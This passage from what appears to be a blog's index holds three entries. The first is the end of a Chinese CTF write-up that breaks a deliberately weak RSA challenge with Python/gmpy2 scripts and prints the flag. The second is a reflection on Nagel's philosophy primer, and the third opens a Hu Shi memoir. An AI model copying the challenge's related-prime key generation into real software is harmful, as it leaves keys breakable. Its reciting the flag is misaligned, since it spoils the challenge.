| (x**2 - 1)**2 ==\u0026gt; x = 2y # assert gmpy.is_prime(y) + gmpy.is_prime(x+1) + ((x**2 - 1)**2 % (2*x*y - 1) + 2) ** 2018 == 30097557298197417800049182668952226601954645169633891463401117760245367082644152355564014438095421962150109895432272944128252155287648477680131934943095113263121691874508742328500559321036238322775864636883202538152031804102118831278605474474352011895348919417742923873371980983336517409056008233804190890418285814476821890492630167665485823056526646050928460488168341721716361299816947722947465808004305806687049198633489997459201469227952552870291934919760829984421958853221330987033580524592596407485826446284220272614663464267135596497185086055090126893989371261962903295313304735911034185619611156742146 = 1 + 1 + 2 ** 2018 # so we have x = 2y # p = gmpy.next_prime(x**3 + y**3) # ==\u0026gt; p = gmpy.next_prime(8*y**3 + y**3) = gmpy.next_prime(9*y**3) # q = gmpy.next_prime(x**2*y + y**2*x) # ==\u0026gt; q = gmpy.next_prime(4*y**2*y + y**2*(2y)) = gmpy.next_prime(6*y**3) # n = p * q # ==\u0026gt; n = p * q ~= (9*y**3) * (6*y**3) = 54*y**6 # So we can factor n with knowing n ~= 54*y**6 n = 260272753019642842691231717156206014402348296256668058656902033827190888150939144319270903947159599144884859205368557385941127216969379550487700198771513118894125094678559478972591331182960004648132846372455712958337042783083099376871113795475285658106058675217077803768944674144803250791799957440111855021945690877200606577646234107957498370758707097662736662439460472126493593605957225541979181422479704018055731221681621886820626215670393536343427267329350730257979042198593215747542270975288047196483958369426727778580292311145109908665004662296440533724591193527886702374790526322791818523938910660223971454070731594803459613066617828657725704376475527288174777197739360634209448477565044519733575375490101670974499385760735451471034271880800081246883157088501597655371430353965493264345172541221268942926210055390568364981514774743693528424196241142665685211916330254113610598390909248626686397970038848966187547231199741 enc = 73933313646416156737449236838459526871566017180178176765840447023088664788672323530940171469589918772272559607026808711216932468486201094786991159096267208480969757088208089800600731106685561375522764783335332964711981392251568543122418192877756299395774738176188452197889668610818741062203831272066261677731889616150485770623945568369493256759711422067551058418926344060504112146971937651406886327429318390247733970549845424064244469193626197360072341969574784310397213033860597822010667926563087858301337091484951760613299203587677078666096526093414014637559237148644939541419075479462431789925219269815364529507771308181435591670281081465439913711912925412078002618729159141400730636976744132429329651487292506365655834202469178066850282850374067239317928012461993443785247524500680257923687511378073703423047348824611101206633407452837948194591695712958510124436821151767823443033286425729473563002691262316964646014201612 # now we calculate the 5th root of n//45 to find the y: def iroot(k, n): UB = 1 while pow(UB, k) \u0026lt; n: UB *= 2 LB = UB / 2 while UB - LB \u0026gt; 1: M = (LB + UB) // 2 midToK = pow(M, k) if midToK \u0026lt; n: LB = M elif n \u0026lt; midToK: UB = M else: return M if pow(UB, k) == n: return UB else: return LB y = iroot(6, n // 54) while True: if gmpy.is_prime(y): if gmpy.next_prime(9*y**3) * gmpy.next_prime(6*y**3) == n: print \u0026#39;Found:\u0026#39;, \u0026#39;y =\u0026#39;, y break else: y += 1 x = 2*y p = gmpy.next_prime(x**3 + y**3) q = gmpy.next_prime(x**2*y + y**2*x) n = p * q phi = (p-1)*(q-1) d = gmpy.invert(0x10001, phi) flag = long_to_bytes(pow(enc, d, n)) print \u0026#39;flag =\u0026#39;, flag 没有gmpy库，稍微改了下\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 import gmpy2 from Crypto.Util.number import * n = 260272753019642842691231717156206014402348296256668058656902033827190888150939144319270903947159599144884859205368557385941127216969379550487700198771513118894125094678559478972591331182960004648132846372455712958337042783083099376871113795475285658106058675217077803768944674144803250791799957440111855021945690877200606577646234107957498370758707097662736662439460472126493593605957225541979181422479704018055731221681621886820626215670393536343427267329350730257979042198593215747542270975288047196483958369426727778580292311145109908665004662296440533724591193527886702374790526322791818523938910660223971454070731594803459613066617828657725704376475527288174777197739360634209448477565044519733575375490101670974499385760735451471034271880800081246883157088501597655371430353965493264345172541221268942926210055390568364981514774743693528424196241142665685211916330254113610598390909248626686397970038848966187547231199741 enc = 73933313646416156737449236838459526871566017180178176765840447023088664788672323530940171469589918772272559607026808711216932468486201094786991159096267208480969757088208089800600731106685561375522764783335332964711981392251568543122418192877756299395774738176188452197889668610818741062203831272066261677731889616150485770623945568369493256759711422067551058418926344060504112146971937651406886327429318390247733970549845424064244469193626197360072341969574784310397213033860597822010667926563087858301337091484951760613299203587677078666096526093414014637559237148644939541419075479462431789925219269815364529507771308181435591670281081465439913711912925412078002618729159141400730636976744132429329651487292506365655834202469178066850282850374067239317928012461993443785247524500680257923687511378073703423047348824611101206633407452837948194591695712958510124436821151767823443033286425729473563002691262316964646014201612 y = gmpy2.iroot( n // 54,6)[0] print \u0026#34;near:\u0026#34;,y for i in range(0x10000): k=y+i if gmpy2.is_prime(k): if gmpy2.next_prime(9*y**3) * gmpy2.next_prime(6*y**3) == n: print \u0026#39;Found: offset=%d y=%d\u0026#39;%(i,k) break x ,y= 2*k,k p = gmpy2.next_prime(x**3 + y**3) q = gmpy2.next_prime(x**2*y + y**2*x) n = p * q phi = (p-1)*(q-1) d = gmpy2.invert(0x10001, phi) flag = long_to_bytes(pow(enc, d, n)) print \u0026#39;flag =\u0026#39;, flag # near: 12996881452793504643693526905573881980920361170852213106754463438614382317225798822548048130268953176983864771790449810537027331620960357639880338702048953 # Found: offset=0 y=12996881452793504643693526905573881980920361170852213106754463438614382317225798822548048130268953176983864771790449810537027331620960357639880338702048953 # flag = flag{e01c9eb8078ea9bbac035ea68021c070} 队友Mads推出x=2y 了，可惜没进一步试下。他在博客写了 推理过程 ，可能不太严谨，但巧妙假设变量关系来消元的思路值得学习。\n","permalink":"https://ret2neo.cn/post/180903-pwnhub-lhy/","summary":"Problem 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 #!/usr/bin/env python import gmpy from Crypto.Util.number import * from secret import x, y, flag assert gmpy.is_prime(y) ** 2016 + gmpy.is_prime(x+1) ** 2017 + ((x**2 - 1)**2 % (2*x*y - 1) + 2) ** 2018 == 30097557298197417800049182668952226601954645169633891463401117760245367082644152355564014438095421962150109895432272944128252155287648477680131934943095113263121691874508742328500559321036238322775864636883202538152031804102118831278605474474352011895348919417742923873371980983336517409056008233804190890418285814476821890492630167665485823056526646050928460488168341721716361299816947722947465808004305806687049198633489997459201469227952552870291934919760829984421958853221330987033580524592596407485826446284220272614663464267135596497185086055090126893989371261962903295313304735911034185619611156742146 p = gmpy.next_prime(x**3 + y**3) #(x+y)**3-3xy(x+y) q = gmpy.next_prime(x**2*y + y**2*x) #xy(x+y) n = p * q phi = (p-1)*(q-1) d = gmpy.","title":"胖哈勃之 LHY"},{"content":"此书原是一本名为 What Does It All Mean? A Very Short Introduction to Philosophy 的小册子，由美国哲学家 Thomas Nagel 编写。我读的是宝树的中文译本 《你的第一本哲学书》 ，总体来说用词准确，衔接流畅，但有些地方有些粗糙，略感生涩，须对照原文多读几遍。\n书籍分为几个小节： 外部世界是否存在、他人的心灵、身心问题、词语的意义、自由意志、对与错、公正、死亡、生活的意义 。由于每个主题都平易近人且值得深思，也多是我自己或深或浅琢磨过的，加之作者表述逻辑清晰，幽默优雅，读起来如坐春风如流水，时有会心一笑或击节叹赏。\n对于每一个主题，作者先描述一些许多人自然而然便会提出的疑问，然后给出各种常见的假设和对于假设的反驳，甚至是对假设的反驳的反驳，到最后我们虽然了解了问题的多种可能的答案，但问题依然处于悬而未决的状态，种种追问所面对的基本不再是我们能够论证什么，而是我们选择相信什么，这颇有些可笑和无奈。\n作者留下句 也许生命不只没有意义，而且是一出荒诞剧。 ( Life may be not only meaningless but absurd.) 便不再多说。书中谈及的这些可能的答案我都发现或接触过，也自以为能理解七八分，但始终不甚满意，或者更诚实地说，不愿接受。这让我觉得可能一切也不过尔尔，一代代人围着一个个基本问题敲敲打打而至今无果，我又何苦执着呢？\n读了一点《大问题：简明哲学导论》，我猛然发现自己大概错了，多年求索却至今才看到正确的方向。哲学的最重要的可能不是提出问题，这本书的中文译名也不是没有道理，在这些疑问和假设的背后是一个个庞大的理论体系，等待我们的深入探索。不停追问是本能，阅读理解别人的答案也不难，困难在于有所相信，并能够 **尽我所能去有力地优雅地有风格地明确表达和论证 ** 我所相信的一切。\n表达对做哲学至关重要，表达不是为了让别人认识我，是为了让我认识我自己。为什么只有表达能做到，因为我是怎样的与我想象中的自己是有偏差的，与我如何表达自己也是有偏差的，但后者偏差更小。实在的我存在于实在的世界，我如何表达自己基本上就决定了我是怎样的。与其说我通过表达自己来认识自己，不如说我通过表达自己来塑造自己，实现自己，定义自己。更直接地，我就是我所表达的一切。\n更激进一点，如果我不表达，那么我就不存在。如果农夫不再耕种，作家不再写作，母亲不再孕育，世上就不再有农夫、作家或母亲。厨师要下厨，司机要开车，工人要搬砖，画家要作画，诗人要写诗，这一切不能在想象中完成。我们都必须靠所作所为成为自己，而也只有成为了自己，认识自己才成为一种可能。\n我终其一生，大概不过是为了做好这一件事，认识我自己。虽然建立自己的哲学未必是我所能胜任的，但从各伟大人物的哲学世界中借些理论，拾些牙慧来过好自己的生活却是可能的。我选择我所相信的，并在表达和论证中确信，从而停下无止境、无答案、无意义的追问，摆脱模棱两可的颓唐秉性和进退两难的思维困局，进而得到宁静，享受当下。上一篇博客里我写了几行表达哲学自杀的代码，现在想来是不对的。此刻我想这样说，哲学不死，自杀无用，从大哉问的深渊中出来也许只是做哲学路上的第一个里程碑。\n（后来发现上面悟到的表达和认识的关系颇有些阳明心学中所谓知行合一的意思😮）\n下面谈谈这本书的主要议题。\n外部世界是否存在 既然人通过感官体验外部世界，人和外部世界之间就隔着一个感官，那么人如何确定外部世界的存在，又如何可能认识外部世界？\n这里面最本质的问题在于我们能在多大程度上相信自己的感官。举个简单的例子，我们看到的电影实际上由每秒超过24张的图片组成，而我们的眼睛是意识不到这点的。我们了解了这个现象，便觉得稀松平常，但还有多少是我们所不了解的呢？从眼睛到五官，再到大脑本身，推而广之，细思恐极。每当我们以为找到可依赖的证据来表明客观世界的存在，我们都会发现这证据本身依然依赖于感官，于是我们陷入自我中心困境(Egocentric Predicament)。外部世界如何存在，甚至是否存在，和我们所感知到的，在多大程度上是一致的呢？可能大相径庭，还可能背道而驰。\n有些人认为除了自己的精神外没有任何东西存在，我们称之为唯我论(Solipsism)。\n有些人对客观世界和客观真理是否存在、能否认识表示怀疑，我们称之为怀疑论(Skepticism)或不可知论。\n有些人认为既然我们始终生活在经由感官去认识的世界里，那么这个世界对我们而言就是毋庸置疑的真实。就像如果一场梦无法醒来，那这梦和真实概念就要重新审视，这场梦就是梦里人全部的真实。这种观点我们称之为验证论(Verificationism)。\n纯粹的唯我论者或怀疑论者没有出路，必须有一些验证论的心思才可能正常地生活下去。既然我们关于外部世界存在的信念是发自本能而坚定有力的，我们就应当顺从这种本能，至少相信生活中一部分事理的理所当然。也只有这样，更深的追问才有可能发生。\n他人的心灵 除了问我所感受到的是真的吗，我们还会问我所感受到的和其他人所感受到的是一样的吗。人和人的交流依赖概念，人对世界的认识依赖感知，不同人建立起的概念和感知的对应关系却未必是一致的。我们都称为红色的东西可能在不同人眼中是完全不一样的感受，这个逻辑是自洽的，不能证否的，但我觉得对生活没有太大影响，可能只有高度智慧而高度敏感的人才会感到苦恼吧，\n身心问题 意识依附于大脑的物理活动，还是就是物理活动本身？别人能打开、观察、测量我的大脑，但无法捕捉我的感受。那么我的感受究竟存在于何处？\n有些人认为人由复杂的生理有机体加上一个完全精神性的灵魂，我们称之为二元论(Dualism)；\n有些人认为精神就是大脑的生理状态，我们称之为物理主义(Physicalism)或唯物主义(Materialism)；\n也有一种两面论(Dual Aspect Theory)，大概说的是有一种大脑状态，对外表现为物质，对内呈现为感受，我不太能理解。\n默认接受验证论后我们很自然地承认物质的实在性，但对于精神的实在性仍然存疑。自然科学在研究物质实在的基础上走了很远，但仍有许多东西无法解释，也许将来会需要借由神秘的心灵实在来认识。\n词语的意义 我们需要一些直接能感受到意义的词来作为词语解释的基础，否则无论试图解释什么概念，都必然陷入无穷的循环定义。提问者只要对定义中的概念不断问是什么，回答者终将崩溃。而这些可以用来解释其他概念的基本概念如何起作用，我们所说所写的一切，又如何可能具有意义？这一切都很神秘，值得探索。\n自由意志 你下决定的过程，只不过是事先被决定的结果在你头脑中出现的过程而已。\n看到这样一句话，不夸张地说，有些不寒而栗。\n有些人怀疑人的主观能动性，车不会自己开，同样的，人也需要被某些东西驱动（可能是一时情境下的诸多复杂因素的合成），人们常常以为这些驱动我们的东西是自己可以控制的，实际上，可能并非如此。\n有些人有一套称为决定论(Determinism) 的完美说辞：\n一切行为在当时情境下都是必然，可追溯前因，而前因也有其前因，层层叠叠，至于无穷，不可总结，不可分析，也不可预料。人的一切行为被周围环境和心理条件所决定，人是因果律的傀儡，并没有自由选择的可能。既然选择不是自由的，那么责任便无从谈起。我走在路上，被一个石头绊倒，和被一个人故意伸出腿绊倒，我应该有同样的心情。我知道抱怨石头没有用，那么我就应该知道抱怨人也没有用。决定论同时导致是非对错的模糊，一切无可褒贬，善无需嘉奖，恶亦无可指摘，人们都不得不，一切都无选择，人的恶行应当被当作自然灾害去对待：）\n如果不是这样的呢？如果人有选择，在作出选择前任何一种选择都是可能发生的呢？那么情况就会显得更加怪异。如果人的行为不是和人的愿望、人格、信念有关的话，那么人的行为是在无缘无故地发生？那如果行为是无缘无故地发生，责任更加无从谈起了。\n正反都走不通，只能说细思恐极。\n对与错 我们如何衡量对错，很多人最开始的想法本质上都是根据规则，违反规则既是错，反之即对。那么规则的对错用什么来衡量呢？\n“规则就是规则，是约定俗成的东西，其本身没有对错”这样的观点可说得通，但能够真正接受它的人恐怕不多。因为如果真是这样，就意味着世上没有对错，只有规则，我们只是用对错来简便地称呼一个行为是否符合规则。没有对错这个事实是难以接受的，因为它让人们的道德感显得滑稽，对人性有所亵渎。\n如果规则有对错，那么就一定有超乎规则的东西可用于判定对错，是什么呢？一个容易想到的词是道德。我们也许可以用是否合乎道德来考量一个行为的对错。\n从多年前开始有意识地审视道德起，我就一直觉得这是个奇怪的东西。它因人而异，在同一个人身上也因时而异，因事而异，它前后矛盾，纠缠不清，尤其在面对复杂的情况时显得边界模糊，十分无力。直到今天，我在这本书中明晰了一个观点：道德不是普遍而客观的，道德的基础是我们对他人的关心。关心他人的感受，关心他人对我们的看法使我们具有道德。一个人对他人有多少关心，他就有多少的道德感和对自我的道德要求。如果一个人完全不在意自身之外的人事物理，那么他就没有道德，对他而言，事无对错，天地宽广。而一个无所相信，无所关怀的人极大可能无恶不作，所以社会需要通过家庭教育、社区教育、校园教育来维持其成员的道德感水平，通过法律来提高作恶成本。\n书中还提到为道德辩护的难点在于我们的行为有太多的动机。这不难理解，因为道德基于关心，而关心有优先级，会变化，纯然主观。对动机的考量本身是困难的，伯夷辞之以为名，仲尼语之以为博 就是对动机的一种诡辩和嘲讽，和对道德的质疑。\n突然想到鲁迅先生的 无尽的远方和无数的人们都与我有关 ，我曾感叹这是一种浩瀚的真情。现在我更明白了，这是一种崇高的道德，一种接近圣人的观念。\n公正 要决定一个人在竞争社会中的收入和地位，需要自然天赋和家庭背景两方面的运气。因此不平等也就来自于这两方面，一是出于社会经济地位的差异，二是出于社会所需要的自然天赋或者才能上的差异。\n对于前者，政府通过税收、再分配和提供社会公共福利来干预经济生活，缩小贫富差距。而对于后者我们难有十分有效的作为，而且更合理的做法也不该是有太多作为。\n生活总是这样，总有一些人比另一些人幸运，只有不幸是由一个人对另一个人的错误行为造成的时候，我们才能对此加以干涉（修正）。\n死亡 人们相信死后世界如何和人们如何看待身心问题是紧密相关的。\n一切的证据都显示出：在人死去之前，有意识的生命完全依赖于神经系统的运行。如果我们只相信通常的观察，不涉及宗教教义或通灵术之类的，似乎没有理由相信死后生活的存在。 另外一些人可能出于宗教信仰就能够相信死后的生活，而不需要任何证据。我本人并不完全理解这种由信仰激励的观念是如何可能的。但显然有人能够理解，甚至认为这很自然。 死了就没有了的话，也没有什么可怕的，毕竟你也感受不到。一个有趣的思路是，你出生前的世界也没有你，你会因为自己的突然存在而感到害怕吗？显然一般不会，而这两种状态转换实际上是没有太大分别的。\n生活的意义 关于意义的思考，一个直接的思路是既然一切关于我的都将从有变无，那么我所做的一切意义何在？\n直观上看，这个思路是无解的，哪怕是胡适的 社会不朽论 也没有用，因为社会不朽只有在社会本身有意义的前提下才有意义。（如果想直观感受下，可以看看《三体》中二向箔摊平太阳系的场景。）\n希望这个问题有解，就得重新审视意义。意义从哪里来，意义和永恒是怎样的关系，永恒又意味着什么。当我们在讨论意义、目的、价值时，我们指的是什么？\n饥则食，渴则饮，困则眠，生活的每个行为也许都可以得到解释，其目的都很清晰。但如果把生活当作一个整体去考量，我是否存在过都是无关紧要的，更别谈我如何存在有什么意义了。\n所以，解决无意义只有一种方式，把意义降级为目的。然后我就会发现丰富的目的，远离匮乏的意义😀。\n然而，这不会起作用的。就像作者所说：\n全书的最后两段感触甚深，贴上来并且自己翻译一下：\nEven if life as a whole is meaningless, perhaps that\u0026rsquo;s nothing to worry about. Perhaps we can recognize it and just go on as before. The trick is to keep your eyes on what\u0026rsquo;s in front of you, and allow justifications to come to an end inside your life, and inside the lives of others to whom you are connected. If you ever ask yourself the question, \u0026ldquo;But what\u0026rsquo;s the point of being alive at all?\u0026rdquo; \u0026ndash; leading the particular life of a student or bartender or whatever you happen to be \u0026ndash; you\u0026rsquo;ll answer \u0026ldquo;There\u0026rsquo;s no point. It wouldn\u0026rsquo;t matter if I didn\u0026rsquo;t exist at all, or if I didn\u0026rsquo;t care about anything. But I do. That\u0026rsquo;s all there is to it.\u0026rdquo;\nSome people find this attitude perfectly satisfying. Others find it depressing, though unavoidable. Part of the problem is that some of us have an incurable tendency to take ourselves seriously. We want to matter to ourselves \u0026ldquo;from the outside.\u0026rdquo; If our lives as a whole seem pointless, then a part of us is dissatisfied \u0026ndash; the part that is always looking over our shoulders at what we are doing. Many human efforts, particularly those in the service of serious ambitions rather than just comfort and survival, get some of their energy from a sense of importance \u0026ndash; a sense that what you are doing is not just important to you, but important in some larger sense: important, period. If we have to give this up, it may threaten to take the wind out of our sails. If life is not real, life is not earnest, and the grave is its goal, perhaps it\u0026rsquo;s ridiculous to take ourselves so seriously. On the other hand, if we can\u0026rsquo;t help taking ourselves so seriously, perhaps we just have to put up with being ridiculous. Life may be not only meaningless but absurd.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 /* 也许生命无意义也无妨，我们大可以意识到这一点，然后一切照旧。 做到这点的技巧在于要只关注眼前，只在你和周围人的生活中寻找做事的理由。 每当自问“生活到底有何意义”，你就告诉自己 “没有意义呀。如果我不曾存在或对一切漠不关心也就罢了，但我已存在，也有所关心，便无需多言。”。 有些人满足于此，有些人不可避免地感到沮丧。 沮丧的部分原因在于这些人总是把自己看得太重，希望生命在自身之外仍有意义。 如果生活整体看上去了无意义，总是反躬自省的那部分自我就会感到失落。 人类的大部分努力，尤其是那些为高于生存的雄心壮志所付出的，都从重要感中获得力量。 这种重要感就是：你所做的一切不只是对自己重要，而是从某种更大的意义上来说，它本身就很重要。 如果我们放弃了这种重要感，我们的生活之船就不再能鼓起前进的风帆。 如果生活既非真实，也不严肃，死亡是唯一目的，那么把自己看得太重就很可笑。 也就是说，如果无法放下重要感，那么就得忍受荒谬感。 所以，生活也许不仅无意义，而且很荒唐。 */ 结语 回头看，我几乎曾一个人走完书中所有的心路历程，我总以为后面还有东西，但作者说人生无意义，人生很荒唐，然后言尽于此，所以我只是又确认了一遍那种绝望感。也许真的，关心你所关心的一切就好了，除了意义本身。\n","permalink":"https://ret2neo.cn/mind/180830-what-does-it-all-mean/","summary":"此书原是一本名为 What Does It All Mean? A Very Short Introduction to Philosophy 的小册子，由美国哲学家 Thomas Nagel 编写。我读的是宝树的中文译本 《你的第一本哲学书》 ，总体来说用词准确，衔接流畅，但有些地方有些粗糙，略感生涩，须对照原文多读几遍。\n书籍分为几个小节： 外部世界是否存在、他人的心灵、身心问题、词语的意义、自由意志、对与错、公正、死亡、生活的意义 。由于每个主题都平易近人且值得深思，也多是我自己或深或浅琢磨过的，加之作者表述逻辑清晰，幽默优雅，读起来如坐春风如流水，时有会心一笑或击节叹赏。\n对于每一个主题，作者先描述一些许多人自然而然便会提出的疑问，然后给出各种常见的假设和对于假设的反驳，甚至是对假设的反驳的反驳，到最后我们虽然了解了问题的多种可能的答案，但问题依然处于悬而未决的状态，种种追问所面对的基本不再是我们能够论证什么，而是我们选择相信什么，这颇有些可笑和无奈。\n作者留下句 也许生命不只没有意义，而且是一出荒诞剧。 ( Life may be not only meaningless but absurd.) 便不再多说。书中谈及的这些可能的答案我都发现或接触过，也自以为能理解七八分，但始终不甚满意，或者更诚实地说，不愿接受。这让我觉得可能一切也不过尔尔，一代代人围着一个个基本问题敲敲打打而至今无果，我又何苦执着呢？\n读了一点《大问题：简明哲学导论》，我猛然发现自己大概错了，多年求索却至今才看到正确的方向。哲学的最重要的可能不是提出问题，这本书的中文译名也不是没有道理，在这些疑问和假设的背后是一个个庞大的理论体系，等待我们的深入探索。不停追问是本能，阅读理解别人的答案也不难，困难在于有所相信，并能够 **尽我所能去有力地优雅地有风格地明确表达和论证 ** 我所相信的一切。\n表达对做哲学至关重要，表达不是为了让别人认识我，是为了让我认识我自己。为什么只有表达能做到，因为我是怎样的与我想象中的自己是有偏差的，与我如何表达自己也是有偏差的，但后者偏差更小。实在的我存在于实在的世界，我如何表达自己基本上就决定了我是怎样的。与其说我通过表达自己来认识自己，不如说我通过表达自己来塑造自己，实现自己，定义自己。更直接地，我就是我所表达的一切。\n更激进一点，如果我不表达，那么我就不存在。如果农夫不再耕种，作家不再写作，母亲不再孕育，世上就不再有农夫、作家或母亲。厨师要下厨，司机要开车，工人要搬砖，画家要作画，诗人要写诗，这一切不能在想象中完成。我们都必须靠所作所为成为自己，而也只有成为了自己，认识自己才成为一种可能。\n我终其一生，大概不过是为了做好这一件事，认识我自己。虽然建立自己的哲学未必是我所能胜任的，但从各伟大人物的哲学世界中借些理论，拾些牙慧来过好自己的生活却是可能的。我选择我所相信的，并在表达和论证中确信，从而停下无止境、无答案、无意义的追问，摆脱模棱两可的颓唐秉性和进退两难的思维困局，进而得到宁静，享受当下。上一篇博客里我写了几行表达哲学自杀的代码，现在想来是不对的。此刻我想这样说，哲学不死，自杀无用，从大哉问的深渊中出来也许只是做哲学路上的第一个里程碑。\n（后来发现上面悟到的表达和认识的关系颇有些阳明心学中所谓知行合一的意思😮）\n下面谈谈这本书的主要议题。\n外部世界是否存在 既然人通过感官体验外部世界，人和外部世界之间就隔着一个感官，那么人如何确定外部世界的存在，又如何可能认识外部世界？\n这里面最本质的问题在于我们能在多大程度上相信自己的感官。举个简单的例子，我们看到的电影实际上由每秒超过24张的图片组成，而我们的眼睛是意识不到这点的。我们了解了这个现象，便觉得稀松平常，但还有多少是我们所不了解的呢？从眼睛到五官，再到大脑本身，推而广之，细思恐极。每当我们以为找到可依赖的证据来表明客观世界的存在，我们都会发现这证据本身依然依赖于感官，于是我们陷入自我中心困境(Egocentric Predicament)。外部世界如何存在，甚至是否存在，和我们所感知到的，在多大程度上是一致的呢？可能大相径庭，还可能背道而驰。\n有些人认为除了自己的精神外没有任何东西存在，我们称之为唯我论(Solipsism)。\n有些人对客观世界和客观真理是否存在、能否认识表示怀疑，我们称之为怀疑论(Skepticism)或不可知论。\n有些人认为既然我们始终生活在经由感官去认识的世界里，那么这个世界对我们而言就是毋庸置疑的真实。就像如果一场梦无法醒来，那这梦和真实概念就要重新审视，这场梦就是梦里人全部的真实。这种观点我们称之为验证论(Verificationism)。\n纯粹的唯我论者或怀疑论者没有出路，必须有一些验证论的心思才可能正常地生活下去。既然我们关于外部世界存在的信念是发自本能而坚定有力的，我们就应当顺从这种本能，至少相信生活中一部分事理的理所当然。也只有这样，更深的追问才有可能发生。\n他人的心灵 除了问我所感受到的是真的吗，我们还会问我所感受到的和其他人所感受到的是一样的吗。人和人的交流依赖概念，人对世界的认识依赖感知，不同人建立起的概念和感知的对应关系却未必是一致的。我们都称为红色的东西可能在不同人眼中是完全不一样的感受，这个逻辑是自洽的，不能证否的，但我觉得对生活没有太大影响，可能只有高度智慧而高度敏感的人才会感到苦恼吧，\n身心问题 意识依附于大脑的物理活动，还是就是物理活动本身？别人能打开、观察、测量我的大脑，但无法捕捉我的感受。那么我的感受究竟存在于何处？\n有些人认为人由复杂的生理有机体加上一个完全精神性的灵魂，我们称之为二元论(Dualism)；\n有些人认为精神就是大脑的生理状态，我们称之为物理主义(Physicalism)或唯物主义(Materialism)；\n也有一种两面论(Dual Aspect Theory)，大概说的是有一种大脑状态，对外表现为物质，对内呈现为感受，我不太能理解。\n默认接受验证论后我们很自然地承认物质的实在性，但对于精神的实在性仍然存疑。自然科学在研究物质实在的基础上走了很远，但仍有许多东西无法解释，也许将来会需要借由神秘的心灵实在来认识。\n词语的意义 我们需要一些直接能感受到意义的词来作为词语解释的基础，否则无论试图解释什么概念，都必然陷入无穷的循环定义。提问者只要对定义中的概念不断问是什么，回答者终将崩溃。而这些可以用来解释其他概念的基本概念如何起作用，我们所说所写的一切，又如何可能具有意义？这一切都很神秘，值得探索。\n自由意志 你下决定的过程，只不过是事先被决定的结果在你头脑中出现的过程而已。\n看到这样一句话，不夸张地说，有些不寒而栗。\n有些人怀疑人的主观能动性，车不会自己开，同样的，人也需要被某些东西驱动（可能是一时情境下的诸多复杂因素的合成），人们常常以为这些驱动我们的东西是自己可以控制的，实际上，可能并非如此。\n有些人有一套称为决定论(Determinism) 的完美说辞：\n一切行为在当时情境下都是必然，可追溯前因，而前因也有其前因，层层叠叠，至于无穷，不可总结，不可分析，也不可预料。人的一切行为被周围环境和心理条件所决定，人是因果律的傀儡，并没有自由选择的可能。既然选择不是自由的，那么责任便无从谈起。我走在路上，被一个石头绊倒，和被一个人故意伸出腿绊倒，我应该有同样的心情。我知道抱怨石头没有用，那么我就应该知道抱怨人也没有用。决定论同时导致是非对错的模糊，一切无可褒贬，善无需嘉奖，恶亦无可指摘，人们都不得不，一切都无选择，人的恶行应当被当作自然灾害去对待：）","title":"从《你的第一本哲学书》想到的"},{"content":"转自 梦远书城 : 胡适《实用人生》 我的信仰\n我父胡珊，是一位学者，也是一个有坚强意志，有治理才干的人。经过一个时期的文史经籍训练后，他对于地理研究，特别是边省的地理，大起兴趣。他前往京师，怀了一封介绍书，又走了四十二日而达北满吉林，进见钦差大臣吴大激。吴氏是现在见知于欧洲研究中国学问者之中国的一个大考古学家。吴氏延见他，问有什么可以替他为力的。我父说道：“没有什么，只求准我随节去解决中俄界务的纠纷，件我得以研究东北各省的地理。”吴氏对于这个只有秀才底子，在关外长途跋涉之后，差不多已是身无分文的学者，觉得有味。他带了这个少年去干他那历史上有名的差使，得他做了一个最有价值、最肯做事的帮手。\n有一次与我父亲同走的一队人，迷陷在一个广阔的大森林之内，三天找不着出路。到粮食告尽，一切侦察均归失败时，我父亲就提议寻觅溪流。溪流是多半流向森林外面去的，一条溪流找到了手，他们一班人就顺流而行，得达安全的地方。我父亲作了一首长诗纪念这次的事迹，乃四十年后，我在《论杜威教授系统思想说》的一篇论文里，用这件事实以为例证，虽则我未尝提到他的名字，有好些与我父亲相熟而犹生存着的人，都还认得出这件故事，并写信问我是不是他们故世已久的朋友的一个小儿子。\n吴大激对我父亲虽曾一度向政府荐举他为“有治省才能的人”，政治上却并未得臻通显，历官江苏、台湾后，遂于台湾团中日战争的结果而割让与日本时，以五十五岁的寿延逝世。\n我是我父亲的幼儿，也是我母亲的独子。我父亲娶妻凡三次；前妻死于太平天国之乱，乱军掠遍安徽南部各县，将其化为灰烬。次娶生了三个儿子、四个女儿。长子从小便证明是个难望洗心革面的败子。我父亲丧了次妻后，写信回家，说他一定要讨一个纯良强健的、做庄家人家的女儿。\n我外祖父务农，于年终几个月内兼业裁缝。他是出身于一个循善的农家，在太平天国之乱中，全家被杀。因他还只是一个小孩子，故被太平军掠做俘虏，带往军中当差。为要防他逃走，他的脸上就刺了“太平天国”四字，终其身都还留着，但是他吃了种种困苦，居然逃了出来，回到家乡，只寻得一片焦土，无一个家人还得活着。他勤苦工作。耕种田地，兼做裁缝，裁缝的手艺，是他在贼营里学来的。他渐渐长成，娶了一房妻子，生下四个儿女，我母亲就是最长的。\n我外祖父一生的心愿就是想重建被太平军毁了的家传老屋。他每天早上，太阳未出，便到溪头去拣选三大担石子，分三次挑回废屋的地基。挑完之后，他才去种田或去做裁缝。到了晚上回家时，又去三次，挑了三如石子，才吃晚饭。凡此辛苦恒毅的工作，都给我母亲默默看在眼里，他暗恨身为女儿，毫无一点法子能减轻他父亲的辛苦，促他的梦想实现。\n随后来了个媒人，在田里与我外祖父会见，雄辩滔滔的向他替我父亲要他大女儿的庚帖。（按胡先生《我的母亲订婚》一章里面，用的是“八字”二字，英文系 irth date 